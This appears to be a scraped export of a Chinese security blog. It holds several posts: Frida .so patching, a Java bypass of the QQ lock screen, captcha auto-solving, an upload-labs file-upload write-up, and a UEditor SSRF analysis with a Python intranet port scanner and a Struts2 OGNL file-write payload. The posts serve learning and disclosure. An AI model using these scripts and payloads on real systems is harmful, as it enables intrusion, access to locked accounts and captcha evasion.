如上所示，该so文件有判断，如果isInMyAPP为false，则会退出，返回null。 我们可以修改CMP R0,#0为CMP R0,#1来绕过该限制。 修改后 更深入的就是对so文件进行分析，找到其中的加密算法。 0x05 总结Frida不仅可以用于hook java层，也可以进行native层的hook。利用Frida进行hook时，要求需要使用已ROOT的手机，对于手机无法ROOT的，安装VirtualXposed后使用Xposed框架也可以进行HOOK。这里就不说明了，有兴趣的可以去试一试。","tags":[{"name":"安卓Hook","slug":"安卓Hook","permalink":"https://fuping.site/tags/%E5%AE%89%E5%8D%93Hook/"},{"name":"Frida","slug":"Frida","permalink":"https://fuping.site/tags/Frida/"},{"name":"SoulAPP","slug":"SoulAPP","permalink":"https://fuping.site/tags/SoulAPP/"}]},{"title":"Windows版本QQ锁定可被绕过","date":"2018-11-19T14:11:33.000Z","path":"2018/11/19/QQ-Lock-bypass/","text":"在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。 情景还原 首先演示一下如何使用抢票软件进行QQ锁定的绕过。这里以最新版本9.0.7（24121）为例。下载后正常安装。 安装后查看版本。 将QQ锁定，然后打开软件，选择QQ通知，点击“获取聊天窗口”，此时会进行QQ窗体的加载，然后在“要发送的窗口”下拉框会显示一个随机字符串，点击“测试发送”按钮，会发现QQ控制面板弹出。 而且是可以进行未锁定前的所有功能。如发送和接收消息，如图所示。 实现过程刚开始的想法是首先获取QQ窗口的句柄，然后再利用句柄进行显示与隐藏。 尝试一这里采用的是精易编程助手来获取句柄，当qq处于非锁定状态，获取QQ窗体句柄后，可以利用句柄对QQ进行隐藏或显示，即使把QQ锁定，也可以进行隐藏或者显示。 但是当QQ隐藏后，此时再获取句柄后，无法绕过QQ的锁定。这时候获取的句柄为QQ锁定状态的句柄。 该方法只能对未锁定的QQ进行操作，锁定后就无法获取控制面板句柄了，因此该方法行不通。 尝试二放弃了精易编程助手，采用更专业的工具spy++。找到句柄后发现标题为一串随机的字符串，与抢票工具获取聊天窗口中标题一样。 猜测需要最终需要获取的句柄就是这个，句柄对应的十六进制为504BE，然后调用windows api进行窗口的显示和隐藏。 显示窗口ShowWindow (句柄, 1)，隐藏窗口ShowWindow (句柄, 0)。 效果如图所示。 这样虽然能够满足，但是却不够智能，无法自动获取句柄，需要借助其他工具去寻找句柄，因此放弃。 尝试三本次测试中走了两条“弯路”，在这里简要说明一下，就不再附详细的过程了。某次发现使用 12临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “TXMenuWindow”)句柄&#x3D;窗口_取父句柄 (窗口_取父句柄 (临时_句柄)) 或者 12临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “”)句柄&#x3D;窗口_取父句柄 (临时_句柄) 可以获取到QQ锁定时控制面板的句柄。如图所示 但这些只是概率事件，多数情况下还是不行的。即使可以使用这两种方法，但是这两种方法获取的都是一个句柄，当有两个QQ时，就无法同时获取两个句柄了，所以该方法不可取。 由于QQ处于锁定时，窗口标题为随机的字符串，所以无法使用FindWindowA这种方法了。 尝试四之最终实现此时想到另外一个思路，遍历屏幕上所有的顶层窗口，然后根据条件进行筛选。 这里用的Java来实现，操作Windows API采用了JNA。 JNA的全称是Java Native Access，你只要在一个java接口中描述本地库中的函数与结构， JNA将在运行期动态访问本地库，自动实现Java接口到本地库函数的映射。 使用maven加入所需的依赖。 1234567891011&lt;dependency&gt; &lt;groupId&gt;net.java.dev.jna&lt;/groupId&gt; &lt;artifactId&gt;jna&lt;/artifactId&gt; &lt;version&gt;5.1.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.java.dev.jna&lt;/groupId&gt; &lt;artifactId&gt;jna-platform&lt;/artifactId&gt; &lt;version&gt;5.1.0&lt;/version&gt; &lt;/dependency&gt; 枚举屏幕上所有的顶层窗口采用的是EnumWindows。 12boolean EnumWindows(WinUser.WNDENUMPROC lpEnumFunc, Pointer data) 该函数枚举屏幕上所有的顶层窗口，并将窗口句柄传送给应用程序定义的回调函数。回调函数返回FALSE将停止枚举，否则EnumWindows函数继续到所有顶层窗口枚举完为止。 参数：lpEnumFunc - 指向应用程序定义的回调函数的长指针。 参数：data - 指定要传递给回调函数的应用程序定义的值。 代码实现如下： 1234567User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123; public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123; System.out.println(hwnd); return true; &#125;&#125;,null); 此时获取的时所有顶层窗口的句柄，剩下的就是去如何进行过滤，留下所需的句柄。 通过对比发现，可以用窗口样式进行区分。当QQ锁定时（或QQ未锁定且最小化时），对应的窗口样式为860C0000（十进制为2248933376）。 下面为QQ锁定时的样式。 通过查询API，可以用User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE)来获取窗口样式。然后通过这种方法进行过滤，当该值为2248933376，则认为对应的hwnd为QQ控制面板的句柄。 主要代码如下： 12345678910User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123; public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123; if(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==2248933376L)&#123; System.out.println(hwnd); &#125; return true; &#125; &#125;,null); 可以看到成功获取了QQ锁定时控制面板的句柄。有了句柄，就可以进行之前的操作了，如显示与隐藏。 当QQ未锁定时，QQ弹出时对应的窗口样式为960c0000（十进制为2517368832）。 此时就可以先通过EnumWindows枚举所有的窗口，然后再使用GetWindowLongPtr(hwnd,User32.GWL_STYLE)获取窗口样式进行匹配，匹配到所需的窗口。 这里将QQ锁定和未锁定的情况都考虑进去，然后获取QQ控制面板的句柄。之后通过GetWindowText获取窗口的标题，再使用ShowWindow进行隐藏与显示操作。主要代码如下： 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws Exception&#123; List&lt;WinDef.HWND&gt; lt = getQQHwnds(); for (WinDef.HWND hwnd:lt) &#123; char[] titleBuffer = new char[512]; User32.INSTANCE.GetWindowText(hwnd,titleBuffer,512); System.out.println(new String(titleBuffer)); User32.INSTANCE.ShowWindow(hwnd,1);//显示 Thread.sleep(2000); User32.INSTANCE.ShowWindow(hwnd,0);//隐藏 Thread.sleep(2000); User32.INSTANCE.ShowWindow(hwnd,1);//显示 Thread.sleep(2000); &#125; &#125; public static List&lt;WinDef.HWND&gt; getQQHwnds()&#123; final List&lt;WinDef.HWND&gt; lt = new ArrayList&lt;WinDef.HWND&gt;(); User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123; public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123; if(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==2517368832L||User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==2248933376L)&#123; lt.add(hwnd); &#125; return true; &#125; &#125;,null); return lt; &#125; 首先获取到QQ控制面板的句柄，然后依次获取其标题，并进行显示-隐藏-显示等过程。效果如图所示。 这种成功实现了QQ锁定时自动获取控制面板句柄，实现了QQ锁定的绕过。而且有多个QQ时，都可以获取其句柄。 总结在一次偶然的情况下可以绕过QQ锁定，于是就进行了尝试，走了一些弯路，最终实现了这种效果。主要过程就是获取所有顶层窗口句柄-根据窗口样式匹配到QQ控制面板的句柄-使用ShowWindow进行显示。也许这不是最佳的解决方法。如果大家有更好的方法或者建议，欢迎分享。 参考资料[1]https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga [2]https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-","tags":[{"name":"锁定绕过","slug":"锁定绕过","permalink":"https://fuping.site/tags/%E9%94%81%E5%AE%9A%E7%BB%95%E8%BF%87/"},{"name":"Windows API","slug":"Windows-API","permalink":"https://fuping.site/tags/Windows-API/"}]},{"title":"中文点选验证码自动识别","date":"2018-08-16T13:27:36.000Z","path":"2018/08/16/Automatically-Identify-Chinese-Point-Selection/","text":"某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。 0x01 验证码的获取首先获取验证码。由于网站比较特殊，就不以他们的为例，自己生成验证码吧。这个不是重点，这里直接贴代码了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpfunction createImage($word,$imagePath,$type,$imageName)&#123; $fontPath = 'msyh.ttc';//字体 $fontSize = 20 * 0.75; foreach ($word as $v ) &#123; $fontarea = imagettfbbox($fontSize, 0, $fontPath, $v); $textWidth = $fontarea[2] - $fontarea[0]; $textHeight = $fontarea[1] - $fontarea[7]; $tmp['text'] = $v; $tmp['size'] = $fontSize; $tmp['width'] = $textWidth; $tmp['height'] = $textHeight; $textArr[] = $tmp; &#125; list($imageWidth, $imageHeight, $imageType) = getimagesize($imagePath); for($i=0;$i&lt;count($textArr);$i++)&#123; list($x, $y) = randPosition($textArr, $imageWidth, $imageHeight, $textArr[$i]['width'], $textArr[$i]['height'],$i,$type); $textArr[$i]['x'] = $x; $textArr[$i]['y'] = $y; &#125; unset($v); //创建图片的实例 $image = imagecreatefromstring(file_get_contents($imagePath)); //字体颜色 $color = imagecolorallocate($image, 0, 0, 0); //绘画文字 foreach($textArr as $v)&#123; imagefttext($image, $v['size'], 0, $v['x'], $v['y'], $color, $fontPath, $v['text']); &#125; if(imagepng($image,$imageName))&#123; echo $imageName.\"\\n\"; &#125;&#125;function randPosition($textArr, $imgW, $imgH, $fontW, $fontH,$i,$type)&#123; switch ($type) &#123; case 0://生成mp $x = rand($i*60, ($i+1)*60-$fontW-3); $y = rand(40,80); break; case 1://生成ap $x = ($i)*25+5; $y = 25; default: break; &#125; $return = array($x, $y); return $return;&#125;$ap_imagePath = 'ap_bg.png';$mp_imagePath = 'mp_bg.png';$ap_imageName = \"ap_\".time().\".png\";$mp_imageName = \"mp_\".time().\".png\";$ap_word = array('请','依','次','点','击','图','中','的','猎', '户','室') ;$mp_word = array('猎', '户', '实','验','室');createImage($ap_word,$ap_imagePath,1,$ap_imageName);createImage($mp_word,$mp_imagePath,0,$mp_imageName);?&gt; 运行后生成这样两张图片。 ap_XXXXX.png mp_XXXXX.png ap_XXXXX.png是说明需要点击的文字，mp_XXXXX.png是需要点击的图片。 0x02 验证码识别对于这种简单的点选验证码，可以有两种很容易的识别方式（机器学习算麻烦的，这里就不列出了。嗯，对，我也不会）。一种是opencv的图像模板匹配，另外一种是OCR识别。 1. opencv的图像模板匹配第一种方式，使用opencv的图像模板匹配。模板匹配是一种在较大图像中搜索和查找模板图像位置的方法，opencv2和opencv3中提供了一个专门用于模板匹配的函数matchTemplate()。它是在输入图像上滑动模板图像（如在2D卷积中），并比较模板图像下的输入图像的模板和补丁。在OpenCV中实现了六种比较方法（这里用到的是cv2.TM_CCOEFF_NORMED），它返回一个灰度图像，其中每个像素表示该像素的邻域与模板匹配的程度。 获得结果后，可以使用cv.minMaxLoc（）函数查找最大/最小值的位置。将其作为矩形的左上角，并将（w，h）作为矩形的宽度和高度，那个矩形就是模板区域。 。 我们进行使用模板匹配来识别这种验证码时，首先先将“模板”找出来，这里我们需要匹配的是“猎”、“户”、“室”这三个字。将这三个字所在的图片进行截取，然后使用matchTemplate()函数在mp中进行匹配。 首先截取第一个字“猎”。 截取之后，就可以在mp中进行匹配。 这里得到了最大和最小位置。我们使用最大位置，然后将最大值作为阈值。获取模板的尺寸，然后在mp中用矩形（红色区域）画出匹配的区域。如下所示。 同理，用黄色和蓝色矩形将“户”、“室”所在的区域画出来。 点选时发送所选区域中间的坐标即可，这里就不再给出实例了。 这种方法虽然简单，但是对于字体不一的就不能很正确的标记出来。 修改生成图片的代码，将mp中的文字的字体设置为随机。 修改的代码如下： 12345678switch ($type) &#123; case 0://mp 文字随机大小 $fontSize = rand(20,30) * 0.75; break; case 1://ap 文字固定 $fontSize = 20 * 0.75; break; &#125; ap生成的结果还是和之前一样，mp的图片如下： 使用同样的代码来匹配。 此时匹配的结果就有些惨不忍睹了。所以就换另外一种识别方式-ocr识别。 2. OCR识别这里采用的是腾讯云的OCR-通用印刷体识别。 参考文档。输入mp图片，返回的是json。 查看json内容，发现包含了图片中的文字、位置和大小等。 同理ap中内容也可以获取。 此时匹配的时候直接就是匹配文字了。首先获取ap中后三个文字，然后与mp中返回的内容匹配，获取其位置和大小，然后再画矩形即可。 由于比较简单，这里直接贴结果。 匹配相当完美。 0x03 总结本文用了两种方法来自动识别汉字点选验证码，第一种采用的是opencv的模板匹配，这种方法虽然也可以匹配到，但这种方法缺点就是对于字体形状差异较大的验证码识别率较低。而第二种方法就比较快捷方便了，而且识别度高，比较推荐第二种方法。 当然这两种方法对于简单、“正规”的验证码可以，遇到复杂的、“扭曲的”验证码就不行了。这时候就要用到机器学习了，而本文只是简单的“识别”，将机器学习用到这里，就有些大材小用了。 相关代码：https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection 0x04 参考[1] http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html [2]https://cloud.tencent.com/document/product/866/17600","tags":[{"name":"点选验证码","slug":"点选验证码","permalink":"https://fuping.site/tags/%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"name":"验证码识别","slug":"验证码识别","permalink":"https://fuping.site/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"}]},{"title":"upload-labs writeup","date":"2018-06-04T02:25:58.000Z","path":"2018/06/04/upload-labs-writeup/","text":"upload-labs是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。 环境搭建我这里用到的是PHPStudy2016。采用的是Apache+php，其中Apache版本为2.4，php版本按照作者所说的为5.2.17。操作系统为Win10 。然后下载upload-labs并放置在PHPStudy安装目录的WWW目录下。也可以采用作者的集成环境。 题目与解法首先需要在upload-labs目录下新建upload目录。 然后就开始答题了。其中13-16暂时要求的是“保证上传后的图片马中仍然包含完整的一句话或webshell代码 ”，我就暂时以13题为例，其余的暂时先不做。第18题暂未解出，所以暂时先省略。 其他题的WriteUp如下： Pass-01在js中判断文件，直接上传拦截后修改为php文件 Pass-02 注意需要带上Content-Type: image/jpeg Pass-03方法1首先名字为3.php:jpg 会写入一个3.php的空文件 然后修改名字为3.&lt;&lt;&lt; 参考https://www.waitalone.cn/php-windows-upload.html 方法2需要在apache httpd.conf进行配置。 AddType application/x-httpd-php .php .phtml 然后上传的文件名可以为3.php.a或者3.phtml 这个解法是查看到作者给的集成环境中有这样的设置 方法3 首先文件名为3.php.::$DATA会生成一个3.php.文件 再将文件名修改为3.php&gt; 第二次的文件名还可以为3.php&lt; 、3.php&gt; 、3.php\\ 以及3.php&quot; 3.php.文件直接删除不掉，可以在bash命令下删除 方法4%aa url解码 其他还有%b3、%b2等。。 Pass-04参考Pass-03的方法1、2、3、4 Pass-05参考Pass-03的方法1、2、3、4 没有对文件名进行小写转换，所以大小写混合或者大写可以绕过 Pass-06参考Pass-03的方法1、2、3、4 这里没有去除空格，所以用“6.php ”即可绕过 Pass-07参考Pass-03的方法1、2、3、4 没有删除结尾的“.”，所以用“7.php.”可以绕过 Pass-08参考Pass-03的方法1、2、3、4 没有对字符串::$DATA进行操作，所以可以使用8.php::$DATA绕过 Pass-09参考Pass-03的方法1、2、3、4 Pass-10关键代码$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。 Pass-11%00截断即可 需关闭magic_quotes_gpc 集成环境中有该设置：magic_quotes_gpc = Off Pass-12%00截断即可，需要url解码 需关闭magic_quotes_gpc 集成环境中有该设置：magic_quotes_gpc = Off Pass-13题目已经更新，要求“保证上传后的图片马中仍然包含完整的一句话或webshell代码 ” 这里就以png格式图片为例 copy xwz.png/b + 1.txt 1111.png 其中xwz.png为正常的png图片，1.txt内容为&lt;?php echo &quot;pwn&quot;;?&gt; 查看上传后的结果 当然也可以直接用hex工具打开图片，在最后追加php代码。 14-16和该题要求类似，统一按该方法处理。步骤省略。 Pass-17参考Pass-03方法1 文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传 Pass-19save_name修改为“upload-19.php.”即可 总结这里面比较通杀的方法是采用aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容。可以参考当php邂逅windows通用上传缺陷这篇文章，里面介绍的很详细。 本文主要用到的绕过方式有： 修改js绕过（或者上传图片格式后抓包修改） 利用文件名aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容 使用3.php::$DATA 绕过 文件名进行小写绕过 “abc.php.” 绕过 “abc.pphphp”绕过 %00截断绕过 URL解码绕过（参考Pass-03)方法4 本文只是给了部分解题的答案，没有过多的描述思路。每道题的解法也不是那么单一固定的。其中Pass-03到Pass-09都可以利用Pass-03的四种方法。 参考 https://github.com/c0ny1/upload-labs https://www.waitalone.cn/php-windows-upload.html","tags":[{"name":"PHP","slug":"PHP","permalink":"https://fuping.site/tags/PHP/"}]},{"title":"UEditor SSRF漏洞(JSP版本)分析与复现","date":"2018-05-25T00:37:15.000Z","path":"2018/05/25/UEditor-SSRF-In-JSP/","text":"前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。 0x01 前言查看官方的更新日志可以发现UEditor编辑器在版本1.4.3.1修复了SSRF漏洞。 那版本1.4.3应该存在SSRF漏洞，本着能搜索就不动手的原则搜了一下，发现wooyun-2015-0133125中提到过这类的漏洞。但我这里是jsp版本的，里面提到jsp版本不一样，只好去分析一下漏洞产生的位置。 0x02 漏洞分析那我们需要查看版本1.4.3与1.4.3.1有什么不同，从而找到存在问题的地方。该项目的代码托管在Github上，地址为：https://github.com/fex-team/ueditor/ 。 查看版本1.4.3.1下的jsp代码. 可以发现在该版本有一次commit，commitId 为a1820147cfc3fbe2960a7d99f8dfbe338c02f0b6。根据字面意思应该是增加了修复SSRF的代码。 下载下来后对比一下v1.4.3.1和v1.4.3代码有什么不同(这里仅对比jsp下的代码)。 发现在v1.4.3.1中修改了jsp/src/com/baidu/ueditor/hunter/ImageHunter.java的validHost方法。 1234567891011121314private boolean validHost ( String hostname ) &#123; try &#123; InetAddress ip = InetAddress.getByName(hostname);//根据主机名获取ip if (ip.isSiteLocalAddress()) &#123;//是否为地区本地地址 return false; &#125; &#125; catch (UnknownHostException e) &#123; return false; &#125; return !filters.contains( hostname ); &#125; 新增了对ip地址是否为内部地址的判断。而在v1.4.3中仅仅是做了是否为过滤的ip地址。 12345private boolean validHost ( String hostname ) &#123; return !filters.contains( hostname ); &#125; isSiteLocalAddress方法作用是当IP地址是地区本地地址（SiteLocalAddress）时返回true，否则返回false。 IPv4的地址本地地址分为三段：10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255。 搜索后发现在captureRemoteData中调用了validHost方法。 根据代码可以分析：首先使用validHost对url进行判断，如果不合法，就提示“被阻止的远程主机”；当满足条件后会使用validContentState方法查看返回的状态是否为200，若不为200，则提示“远程连接出错”；进而对后缀、文件大小进行判断，都符合之后才进行图片的保存。如果url无法访问，则提示“抓取远程图片失败”。 所以可以根据返回的内容，来推断该url对应的主机是否可以访问。由于在版本v1.4.3中没有对请求的主机进行验证，从而造成了SSRF漏洞。 继续查看在capture方法中调用了captureRemoteData。 1234567891011public State capture ( String[] list ) &#123; MultiState state = new MultiState( true ); for ( String source : list ) &#123; state.addState( captureRemoteData( source ) ); &#125; return state; &#125; 在invoke中调用了capture. 1234567891011121314151617181920212223242526272829public String invoke() &#123; if ( actionType == null || !ActionMap.mapping.containsKey( actionType ) ) &#123; return new BaseState( false, AppInfo.INVALID_ACTION ).toJSONString(); &#125; ... State state = null; int actionCode = ActionMap.getType( this.actionType ); ... switch ( actionCode ) &#123; ... case ActionMap.CATCH_IMAGE: conf = configManager.getConfig( actionCode ); String[] list = this.request.getParameterValues( (String)conf.get( \"fieldName\" ) ); state = new ImageHunter( conf ).capture( list ); break; ... &#125; return state.toJSONString(); &#125; 当调用capture需要满足条件为actionCode为ActionMap.CATCH_IMAGE，在ActionMap中value为ActionMap.CATCH_IMAGE对应的key为catchimage。所以当actionType值为catchimage，即action参数对应为catchimage时，才可能触发SSRF漏洞。下面对漏洞进行验证。 0x03 漏洞验证这里用的是v1.4.3 jsp版本，下载ueditor1_4_3-utf8-jsp.zip，之后进行配置（可以参考http://fex.baidu.com/ueditor/#server-jsp）。 功能实现的入口文件是jsp/controller.jsp。由上述分析可知需要满足action参数为catchimage。 在case ActionMap.CATCH_IMAGE中下断点，然后进行调试。 访问链接http://localhost:8088/jsp/controller.jsp?action=catchimage 继续运行发现list为空，然后就抛出了异常。 再次运行，查看list数据从何而来。 可以看出list的数据从浏览器source[]参数而来。这里source[]需要后缀为图片格式，具体可以查看config.js中的catcherAllowFiles。 已知192.168.135.133开启了tomcat服务，且端口为8080。我们这里访问一张不存在的图片，例如用UUID生成一张图片的名称。 构造请求链接：http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png 当进入validHost方法时，由于被访问的主机地址不在过滤的范围，所以返回true。 这里可以发现，仅仅对127.0.0.1、localhost和img.baidu.com进行了限制，当ip为本地地址时并没有限制，从而可以进行内网探测。 而该图片由于不存在，所以状态码为404，到此抓取图片过程结束，并返回结果。 这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点： 如果抓取不存在的图片地址时，页面返回{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\\u8fdc\\u7a0b\\u8fde\\u63a5\\u51fa\\u9519&quot;} ]}，即state为“远程连接出错”。 如果成功抓取到图片，页面返回{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;SUCCESS&quot;,&quot;size&quot;: &quot;5103&quot;,&quot;source&quot;: &quot;http://192.168.135.133:8080/tomcat.png&quot;,&quot;title&quot;: &quot;1527173588127099881.png&quot;,&quot;url&quot;: &quot;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&quot;} ]}，即state为“SUCCESS”。 如果主机无法访问，页面返回{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\\u6293\\u53d6\\u8fdc\\u7a0b\\u56fe\\u7247\\u5931\\u8d25&quot;} ]}，即state为“抓取远程图片失败”。 由于除了在config.js中的catcherLocalDomain配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。 0x04 代码实现由上述分析，根据返回包中的state进行判断，当state为&quot;远程连接出错&quot;或者为”SUCCESS”时表示该主机存在，且对应的端口为开放状态。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839__Date__=\"20180524\"'''Usage: python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.133 python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.0/24 Python version: 3.6.2requirements:IPy==0.83'''import sysimport jsonimport requestsfrom IPy import IPdef check(url,ip,port): url = '%s/jsp/controller.jsp?action=catchimage&amp;source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png' % (url,ip,port) res = requests.get(url) result = res.text result = result.replace(\"list\",\"\\\"list\\\"\") res_json = json.loads(result) state = res_json['list'][0]['state'] if state == '远程连接出错' or state == 'SUCCESS': print(ip,port,'is Open')def main(url,ip): ips = IP(ip) ports = [80,8080] for i in ips: for port in ports: check(url,i,port)if __name__ == '__main__': url = sys.argv[1] ip = sys.argv[2] main(url,ip) 由于返回的结果为{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;...&quot;} ]}并不能直接用json来解析，需要将list替换为”list”后才可以作为json来解析。当然也可以直接使用burp来测试。 在实际测试中的测试结果如下： 0x05 综合利用对于这样的Bool型SSRF ，页面仅返回了状态，而没有更多别的信息，要想进一步利用，可以根据如下的思路： 内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果 内网探测首先进行内网探测，查看内网开放的主机和端口。这里以本地为例。 执行命令： python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.155 123192.168.135.155 80 is Open192.168.135.155 8080 is Open 发现端口80 和 8080 开放，然后进行应用的识别。 应用识别80端口由于没有可以识别的特征，所以未识别到应用的类型，而8080端口可以识别出来为tomcat服务器。 然后尝试查看是否存在Struts2漏洞。 攻击Payload由于在抓取远程图片时，会请求给出的URL地址，所以可以利用Struts2漏洞在内网服务器（这里为192.168.135.155）上写入一个后缀为图片格式（如png、jpg)的文件（因为只能抓取图片格式的文件，所以这里写入了图片后缀的文件），然后利用Ueditor抓取图片的功能，将写入的图片文件抓取到ueditor服务器中，然后访问图片查看攻击结果。 首先写文件，这里利用Struts2漏洞在内网服务器web项目下写入一个名字为b5e592d2-ab5b-476d-865a-8299a0625490.png的文件，内容为Struts2_Test.png。 这里之所以写入内容为Struts2_Test.png，是由于在抓取图片时会判断图片链接的后缀是否为图片格式。当然还有其他的写法，例如 http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。 然后再次利用Ueditor抓取远程图片的功能将写入内网服务器的“图片文件”抓取下来，查看其内容。 这里需要抓取的图片地址为：http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png 由上图可以看出，最后抓取的文件保存地址为：/ueditor/jsp/upload/image/20180525/1527181480175039672.png 查看结果然后访问http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png 查看是否攻击成功。 表明攻击成功。 0x06 总结由于UEditor在v1.4.3之前没有加入对内部IP的限制，所以在使用抓取图片的功能时，造成SSRF漏洞。可以进行内网服务器的探测。然后根据内网服务器的特征（如/jmx-console/images/logo.gif, /tomcat.png），判断其使用的组件，并猜测可能存在的漏洞，然后进行进一步的渗透。","tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://fuping.site/tags/SSRF/"},{"name":"Ueditor","slug":"Ueditor","permalink":"https://fuping.site/tags/Ueditor/"}]},{"title":"某PHP加密文件解密过程初探","date":"2018-02-08T10:08:24.000Z","path":"2018/02/08/Free-PhpJiaMi-Decrypt/","text":"最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。 0x01 环境准备采用的IDE为VSCode，需要安装PHP DEBUG插件和XDebug 插件。安装php debug插件比较简单，直接快捷键ctrl + shift + x 或者 “查看-扩展” 打开扩展面板。输入”php debug”搜索。然后安装即可。其次是安装XDebug。安装可以参考:https://xdebug.org/docs/install 。首先查看一下PHP版本。我这里用的是5.5.30。打开php.ini，找到XDebug标签（我这里ext目录已经有xdebug.dll了，直接启用扩展即可）。如果没有XDebug标签，自己添加即可。打开扩展。注意设置xdebug.remote_autostart = 1。这样设置好debug和断点后，浏览器运行即可自动命中断点。打开VSCode，设置编辑php的可执行文件路径。这样调试所需的环境就配置好了。使用时打开左侧的调试按钮，然后添加配置语言选择PHP。给代码添加断点后，点击开始调试按钮。浏览器访问时会在断点处停下，就可以进行调试了。乱码的话可以通过更改文件编码来设置。快捷键Ctrl + Shift + P，选择更改文件编码，找到合适的编码。php最大执行时间是30秒，超过30秒会自动终止，因此调试的时候要修改一下时间，在php.ini 文件中修改最大运行时间为5分钟。 1max_execution_time = 300 0x02 解密1.独立加密上面环境已经准备好了，下面就开始正式工作了。首先需要获得一个加密的文件。我直接利用上面的文件去某加密网站进行加密。加密后大概是这样的 1&lt;?php /* PHP Encode by http://Www.PHPJiaMi.Com/ */error_reporting(0);ini_set(\"display_errors\", 0);if(!defined('kcapwkef'))&#123;define('kcapwkef',__FILE__);if(!function_exists(\"�㒁�؁��\"))&#123;function �����ٹ�($������)&#123;global$Đ���Л�,$�…… 使用PHP-Parser对代码进行格式化，便于调试。执行命令composer require nikic/php-parser利用作者的format.php将代码格式化。代码如下： 12345678910111213141516&lt;?phpuse PhpParser\\Error;use PhpParser\\ParserFactory;use PhpParser\\PrettyPrinter;require 'vendor/autoload.php';$code = file_get_contents('9014/t.php');$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);try &#123; $ast = $parser-&gt;parse($code);&#125; catch (Error $error) &#123; echo \"Parse error: &#123;$error-&gt;getMessage()&#125;\\n\"; 